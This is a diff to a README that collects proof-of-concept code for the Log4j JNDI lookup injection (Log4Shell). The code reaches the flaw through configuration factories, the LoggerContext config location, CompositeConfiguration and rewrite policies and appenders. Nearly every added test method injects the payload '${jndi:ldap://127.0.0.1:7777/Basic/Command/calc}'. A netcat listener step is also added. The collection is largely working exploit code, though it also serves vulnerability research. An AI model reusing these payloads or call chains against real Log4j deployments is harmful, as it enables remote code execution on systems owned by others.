@@ -14,6 +14,11 @@ This projects is a poc list for *log4j* java library, which extends default poc 
 }
 ```
 
+**run ldpa server**
+```
+nc -l -p 7777
+```
+
 ## Pocs for FileManager Tree
 
 **RollingFileManager.build()**
@@ -131,5 +136,169 @@ This projects is a poc list for *log4j* java library, which extends default poc 
             IfFileName.createNameCondition(String.format("%s-*.log.zip", "appname"), null, IfAccumulatedFileCount.createFileCountCondition(1))
         }).withFilePermissionsString("rwxrwxrwx").withBasePath("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}").withConfiguration(new DefaultConfiguration()).build();
         action.execute();
+    }
+```
+
+**AbstractAction.execute()**
+
+In the inheritance tree, AbstractAction is related to AbstractPathAction. Primarily, AbstractPathAction introduces a new field:
+
+```
+private final StrSubstitutor subst;
+```
+
+This field is utilized within the execute method of AbstractPathAction, which triggers the entire call stack associated with StrSubstitutor.replace -> StrSubstitutor.resolveVariable -> StrSubstitutor.lookup. Unlike AbstractAction, which lacks the StrSubstitutor attribute and contains an empty execute method (since it's an abstract interface), AbstractAction does not have any proof of concept for reproducing the same issue.
+
+## Pocs for Config Tree ##
+
+**JSONConfigurationFactory.getConfiguration()**
+```
+ @Test
+    public void getConfigurationJSONConfigurationFactoryTest() throws IOException {
+        String jsonConfig = "{\"injectedObject\": {\"injectedProperty\":\"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\"}}";
+        ByteArrayInputStream bis = new ByteArrayInputStream(jsonConfig.getBytes(StandardCharsets.UTF_8));
+        ConfigurationSource source = new ConfigurationSource(bis);
+
+        JsonConfigurationFactory factory = new JsonConfigurationFactory();
+        Configuration config = factory.getConfiguration(new LoggerContext("testContext"), source);
+    }
+```
+
+**LoggerContext.setConfigLocation()**
+```
+@Test
+    public void setConfigLocationUriTest()  {
+        URI configUri = new File("config.json").toURI();
+        LoggerContext context = (LoggerContext) LogManager.getContext(false);
+        context.setConfigLocation(configUri);
+    }
+```
+
+**ConfigurationFactory.getConfiguration()**
+
+Required dedpendecies
+```
+implementation("com.fasterxml.jackson.core:jackson-databind:2.17.0")
+```
+
+```
+ @Test
+    public void getConfigurationConfigurationFactoryTest() throws IOException {
+        String configText = "{"
+                + "\"Configuration\": {"
+                + "    \"injectedProperty\": \"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\""
+                + "}"
+                + "}";
+        ByteArrayInputStream bis = new ByteArrayInputStream(configText.getBytes(StandardCharsets.UTF_8));
+        ConfigurationSource source = new ConfigurationSource(bis, new File("config.json"));
+        Configuration config = ConfigurationFactory.getInstance().getConfiguration(new LoggerContext("testContext"), source);
+    }
+```
+
+**YamlConfigurationFactory.getConfiguration()**
+
+Required dedpendecies
+```
+implementation("com.fasterxml.jackson.dataformat:jackson-dataformat-yaml:2.17.1")
+```
+
+```
+@Test
+    public void getConfigurationYamlConfigurationFactoryTest() throws IOException {
+        String yamlConfig = "Configuration:\n" +
+                "  injectedProperty: \"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\"";
+        ByteArrayInputStream bis = new ByteArrayInputStream(yamlConfig.getBytes(StandardCharsets.UTF_8));
+        ConfigurationSource source = new ConfigurationSource(bis);
+
+        YamlConfigurationFactory factory = new YamlConfigurationFactory();
+        Configuration config = factory.getConfiguration(new LoggerContext("testContext"), source);
+    }
+```
+
+**LoggerContextAdminMBean.setConfigLocationUri()**
+
+```
+    @Test
+    public void setConfigLocationUriLoggerContextAdminMBeanTest() throws Exception {
+        LoggerContext context = new LoggerContext("testContext");
+        LoggerContextAdminMBean mBean = new LoggerContextAdmin(context, new Executor() {
+            @Override
+            public void execute(Runnable command) {
+                command.run();
+            }
+        });
+        URI newConfigUri = new File("config.json").toURI();
+        mBean.setConfigLocationUri(newConfigUri.toString());
+    }
+```
+
+**CompositeConfiguration.reconfigure()**
+```
+ @Test
+    public void reconfigureCompositeConfigurationTest() throws Exception {
+        ConfigurationBuilder<BuiltConfiguration> builder = ConfigurationBuilderFactory.newConfigurationBuilder();
+        AbstractConfiguration config = builder.addProperty("injectedProperty", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}").build();
+        CompositeConfiguration compositeConfig = new CompositeConfiguration(Arrays.asList(config));
+        compositeConfig.reconfigure();
+    }
+```
+
+#### Pocs for Rewriter Tree ####
+
+**PropertiesRewritePolicy.rewrite()**
+
+```
+@Test
+    public void rewritePropertiesRewritePolicyTest() {
+        Configuration configuration = new DefaultConfiguration();
+        Property[] properties = new Property[]{
+                Property.createProperty("injectedProperty", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
+        };
+
+        RewritePolicy policy = PropertiesRewritePolicy.createPolicy(configuration, properties);
+        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
+        LogEvent rewrittenEvent = policy.rewrite(logEvent);
+    }
+```
+
+**RewritePolicy.append()**
+
+```
+@Test
+    public void appendRewritePolicyTest() {
+        LoggerContext context = new LoggerContext("TestContext");
+        Configuration config = context.getConfiguration();
+
+        Appender consoleAppender = ConsoleAppender.createDefaultAppenderForLayout(PatternLayout.createDefaultLayout(config));
+        consoleAppender.start();
+
+        AppenderRef appenderRef = AppenderRef.createAppenderRef("console", null, null);
+        AppenderRef[] refs = new AppenderRef[]{appenderRef};
+
+        Property[] properties = new Property[]{
+                Property.createProperty("injectedProperty", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
+        };
+        RewritePolicy rewritePolicy = PropertiesRewritePolicy.createPolicy(config, properties);
+
+        RewriteAppender rewriteAppender = RewriteAppender.createAppender(
+                "rewriteAppender",
+                "false",
+                refs,
+                config,
+                rewritePolicy,
+                ThresholdFilter.createFilter(Level.ALL, null, null)
+        );
+        rewriteAppender.start();
+
+
+        config.addAppender(consoleAppender);
+        config.addAppender(rewriteAppender);
+        context.updateLoggers();
+
+        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
+        rewriteAppender.append(logEvent);
+
+        rewriteAppender.stop();
+        consoleAppender.stop();
     }
 ```
